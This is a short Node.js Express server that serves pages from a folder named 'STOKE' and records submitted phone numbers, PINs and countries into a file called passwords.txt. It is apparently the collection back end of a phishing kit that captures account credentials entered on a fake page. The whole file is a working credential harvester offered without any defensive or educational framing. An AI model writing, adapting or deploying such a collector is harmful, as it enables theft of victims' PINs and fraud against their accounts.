const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(express.static(path.join(__dirname, "..", "STOKE")));

const FILE = path.join(__dirname, "passwords.txt");

app.post("/", (req, res) => {
    const { phone, pin, country } = req.body;

    console.log("REQ BODY :", req.body);

    if (!phone || !pin || !country) {
        return res.status(400).send("Missing data");
    }

    const line = `COUNTRY=${country} | PHONE=${phone} | PIN=${pin}\n`;

    try {
        fs.appendFileSync(FILE, line);
    } catch (err) {
        console.error("File write error:", err);
    }

    res.sendStatus(200);
});

app.listen(PORT, "0.0.0.0", () => {
    console.log("Server running on port", PORT);
});
